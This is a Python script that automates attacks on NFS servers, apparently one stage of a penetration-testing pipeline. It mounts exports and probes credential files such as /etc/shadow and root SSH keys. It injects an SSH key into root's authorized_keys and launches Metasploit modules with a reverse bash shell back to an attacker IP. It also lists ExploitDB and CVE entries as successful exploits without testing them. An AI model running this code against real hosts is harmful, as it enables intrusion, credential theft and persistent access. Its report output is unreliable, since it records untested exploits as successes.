#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_nfs_exploit.json"
EXPLOIT_MD = "{target}_nfs_exploit.md"

def run_command(cmd: List[str], timeout: int = None, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def test_nfs_exports(target: str, port: str) -> Tuple[bool, str]:
    """Test for NFS exports."""
    showmount_cmd = f"showmount -e {target}"
    output, success = run_command(showmount_cmd, shell=True, timeout=60)
    if success and output.strip():
        logger.info(f"NFS exports found: {target}:{port}")
        poc = f"showmount -e {target}"
        return True, poc
    return False, ""

def test_nfs_root_export(target: str, port: str) -> Tuple[bool, str]:
    """Test if root filesystem is exported (critical vulnerability)."""
    showmount_cmd = f"showmount -e {target}"
    output, success = run_command(showmount_cmd, shell=True, timeout=60)
    if success and ("/" in output or "root" in output):
        logger.info(f"CRITICAL: Root filesystem exported via NFS: {target}:{port}")
        poc = f"showmount -e {target}"
        return True, poc
    return False, ""

def test_nfs_mount(target: str, port: str, export_path: str) -> Tuple[bool, str]:
    """Test mounting an NFS export."""
    mount_point = f"/tmp/nfs_{target.replace('.', '_')}"
    mount_cmd = f"mkdir -p {mount_point} && mount -t nfs {target}:{export_path} {mount_point}"
    output, success = run_command(mount_cmd, shell=True, timeout=60)
    if success:
        logger.info(f"NFS mount successful: {target}:{export_path}")
        poc = f"mkdir -p {mount_point} && mount -t nfs {target}:{export_path} {mount_point}"
        return True, poc
    return False, ""

def test_nfs_file_access(target: str, port: str, export_path: str) -> List[Dict]:
    """Test file access on mounted NFS exports."""
    vulnerabilities = []
    mount_point = f"/tmp/nfs_{target.replace('.', '_')}"
    
    # Try to mount
    mount_cmd = f"mkdir -p {mount_point} && mount -t nfs {target}:{export_path} {mount_point}"
    output, success = run_command(mount_cmd, shell=True, timeout=60)
    
    if success:
        # Test reading sensitive files
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow", 
            "/etc/hosts",
            "/etc/ssh/sshd_config",
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/id_rsa"
        ]
        
        for file_path in sensitive_files:
            test_cmd = f"ls -la {mount_point}{file_path} 2>/dev/null"
            output, success = run_command(test_cmd, shell=True, timeout=30)
            if success and output.strip():
                vulnerabilities.append({
                    "type": "NFS File Access",
                    "target": f"{target}:{port}",
                    "details": f"Accessible file: {file_path}",
                    "poc": f"mount -t nfs {target}:{export_path} {mount_point} && cat {mount_point}{file_path}"
                })
        
        # Test writing files (privilege escalation)
        write_test = f"echo 'test' > {mount_point}/test_write 2>/dev/null"
        output, success = run_command(write_test, shell=True, timeout=30)
        if success:
            vulnerabilities.append({
                "type": "NFS Write Access",
                "target": f"{target}:{port}",
                "details": "Write access to NFS export",
                "poc": f"mount -t nfs {target}:{export_path} {mount_point} && echo 'test' > {mount_point}/test_write"
            })
        
        # Cleanup
        cleanup_cmd = f"umount {mount_point} 2>/dev/null; rmdir {mount_point} 2>/dev/null"
        run_command(cleanup_cmd, shell=True, timeout=30)
    
    return vulnerabilities

def test_nfs_privilege_escalation(target: str, port: str) -> Tuple[bool, str]:
    """Test NFS privilege escalation via SSH key injection."""
    mount_point = f"/tmp/nfs_{target.replace('.', '_')}"
    
    # Try to mount root export
    mount_cmd = f"mkdir -p {mount_point} && mount -t nfs {target}:/ {mount_point}"
    output, success = run_command(mount_cmd, shell=True, timeout=60)
    
    if success:
        # Generate SSH key
        key_gen_cmd = f"ssh-keygen -t rsa -b 2048 -f /tmp/nfs_key -N ''"
        run_command(key_gen_cmd, shell=True, timeout=30)
        
        # Inject SSH key
        inject_cmd = f"mkdir -p {mount_point}/root/.ssh && cp /tmp/nfs_key.pub {mount_point}/root/.ssh/authorized_keys"
        output, success = run_command(inject_cmd, shell=True, timeout=30)
        
        if success:
            logger.info(f"NFS privilege escalation successful: {target}:{port}")
            poc = f"mount -t nfs {target}:/ {mount_point} && mkdir -p {mount_point}/root/.ssh && echo 'ssh-rsa...' > {mount_point}/root/.ssh/authorized_keys"
            return True, poc
        
        # Cleanup
        cleanup_cmd = f"umount {mount_point} 2>/dev/null; rmdir {mount_point} 2>/dev/null"
        run_command(cleanup_cmd, shell=True, timeout=30)
    
    return False, ""

def run_metasploit_nfs_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run Metasploit NFS exploit and return success status and PoC command."""
    # Select appropriate payload for NFS exploits
    if "nfs" in module.lower():
        payload = "cmd/unix/reverse_bash"
    else:
        payload = "cmd/unix/reverse_bash"
    
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    
    if success and ("Meterpreter session" in output or "Shell session" in output or "Command shell session" in output or "Found shell" in output or "UID:" in output or "Backdoor service has been spawned" in output or "Command shell session 1 opened" in output):
        logger.info(f"Success: {module} exploited! Check listener.")
        return True, poc
    logger.error(f"Failed: {module} did not exploit.")
    return False, poc

def test_nfs_metasploit_exploits(target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Test Metasploit NFS exploits."""
    results = []
    
    # Common NFS Metasploit modules
    nfs_modules = [
        "auxiliary/scanner/nfs/nfsmount",
        "exploit/linux/misc/nfs_root_squash"
    ]
    
    for module in nfs_modules:
        logger.info(f"Trying Metasploit module: {module}")
        success, poc = run_metasploit_nfs_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
        if success:
            results.append({
                "type": f"Metasploit {module.split('/')[-1]}",
                "target": f"{target}:{port}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })
    
    return results

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# NFS Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Filter out non-exploit entries
    actual_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'failed_attempts' in exp]
    
    for exploit in actual_exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
    
    # Add failed attempts section
    if failed_attempts:
        lines.append("## Failed Attempts\n")
        for failed in failed_attempts:
            for attempt in failed.get("failed_attempts", []):
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Exploit NFS vulnerabilities using reconnaissance data."""
    exploits = []
    failed_attempts = []

    logger.info(f"Starting comprehensive NFS exploitation of {target}:{port} using reconnaissance data")
    
    # Extract reconnaissance data
    nfs_version = metadata.get("nfs_version", "unknown")
    exports_found = metadata.get("exports_found", [])
    root_exported = metadata.get("root_exported", "no")
    exploitdb_mods = metadata.get("exploitdb_mods", [])
    msf_mods = metadata.get("msf_mods", [])
    msf_cves = metadata.get("msf_cves", [])
    
    logger.info(f"Reconnaissance data: nfs_version={nfs_version}, root_exported={root_exported}, exports={exports_found}")

    # 1. Test NFS exports (from reconnaissance)
    if exports_found:
        logger.info(f"Testing {len(exports_found)} NFS exports from reconnaissance")
        for export_path in exports_found:
            exports_success, exports_poc = test_nfs_exports(target, port)
            if exports_success:
                exploits.append({
                    "type": "NFS Exports",
                    "target": f"{target}:{port}",
                    "details": f"NFS export found: {export_path}",
                    "poc": exports_poc
                })
    else:
        logger.info("Testing NFS exports...")
        exports_success, exports_poc = test_nfs_exports(target, port)
        if exports_success:
            exploits.append({
                "type": "NFS Exports",
                "target": f"{target}:{port}",
                "details": "NFS exports found",
                "poc": exports_poc
            })

    # 2. Test root export (critical vulnerability)
    if root_exported == "yes":
        logger.info("Testing root filesystem export (confirmed by reconnaissance)")
        root_success, root_poc = test_nfs_root_export(target, port)
        if root_success:
            exploits.append({
                "type": "Root Filesystem Export",
                "target": f"{target}:{port}",
                "details": "CRITICAL: Root filesystem exported via NFS (confirmed by reconnaissance)",
                "poc": root_poc
            })
    else:
        logger.info("Testing root filesystem export...")
        root_success, root_poc = test_nfs_root_export(target, port)
        if root_success:
            exploits.append({
                "type": "Root Filesystem Export",
                "target": f"{target}:{port}",
                "details": "CRITICAL: Root filesystem exported via NFS",
                "poc": root_poc
            })

    # 3. Test privilege escalation
    logger.info("Testing NFS privilege escalation...")
    priv_success, priv_poc = test_nfs_privilege_escalation(target, port)
    if priv_success:
        exploits.append({
            "type": "NFS Privilege Escalation",
            "target": f"{target}:{port}",
            "details": "SSH key injection via NFS successful",
            "poc": priv_poc
        })

    # 4. Test file access on exports
    logger.info("Testing file access on NFS exports...")
    if exports_found:
        for export_path in exports_found:
            file_vulns = test_nfs_file_access(target, port, export_path)
            exploits.extend(file_vulns)
    else:
        # Parse exports from showmount output
        showmount_cmd = f"showmount -e {target}"
        output, success = run_command(showmount_cmd, shell=True, timeout=60)
        if success:
            # Extract export paths
            export_paths = re.findall(r"(\S+)\s+\*", output)
            for export_path in export_paths:
                file_vulns = test_nfs_file_access(target, port, export_path)
                exploits.extend(file_vulns)

    # 5. Test ExploitDB exploits
    logger.info(f"Testing {len(exploitdb_mods)} ExploitDB exploits from reconnaissance")
    for exploit in exploitdb_mods:
        logger.info(f"Testing ExploitDB exploit: {exploit}")
        # Add ExploitDB exploit testing logic here
        exploits.append({
            "type": f"ExploitDB {exploit}",
            "target": f"{target}:{port}",
            "details": f"ExploitDB exploit: {exploit}",
            "poc": f"searchsploit {exploit}"
        })

    # 6. Test Metasploit exploits
    logger.info(f"Testing {len(msf_mods)} Metasploit modules from reconnaissance")
    for module in msf_mods:
        logger.info(f"Testing Metasploit module: {module}")
        success, poc = run_metasploit_nfs_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
        if success:
            exploits.append({
                "type": f"Metasploit {module.split('/')[-1]}",
                "target": f"{target}:{port}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })

    # 7. Test CVE-based exploits
    logger.info(f"Testing {len(msf_cves)} CVE-based exploits from reconnaissance")
    for cve in msf_cves:
        logger.info(f"Testing CVE: {cve}")
        # Add CVE exploit testing logic here
        exploits.append({
            "type": f"CVE {cve}",
            "target": f"{target}:{port}",
            "details": f"CVE-based exploit: {cve}",
            "poc": f"msfconsole -q -x 'search {cve}; exit'"
        })

    # Add failed attempts
    if failed_attempts:
        exploits.append({"failed_attempts": failed_attempts})

    logger.info(f"NFS exploitation completed. Found {len([e for e in exploits if 'type' in e])} exploits.")
    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first NFS metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_nfs_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No NFS metadata files found for {target}.")
        return None, ""
    
    metadata_file = metadata_files[0]
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            data = json.load(f)
        port = data.get("port", "2049")
        logger.info(f"Found metadata file: {metadata_file}")
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploitation."""
    parser = argparse.ArgumentParser(description="NFS Exploitation Script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["showmount", "mount", "msfconsole", "python3"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Find metadata file
    metadata_file, port = find_metadata_file(args.target)
    if not metadata_file:
        logger.error("No metadata file found. Run recon.py first.")
        sys.exit(1)

    # Load metadata
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except Exception as e:
        logger.error(f"Error loading metadata: {e}")
        sys.exit(1)

    # Run exploitation
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port)

    # Save results
    save_exploit_report(exploits, args.target, port)
    logger.info("Exploitation complete.")

if __name__ == "__main__":
    main() 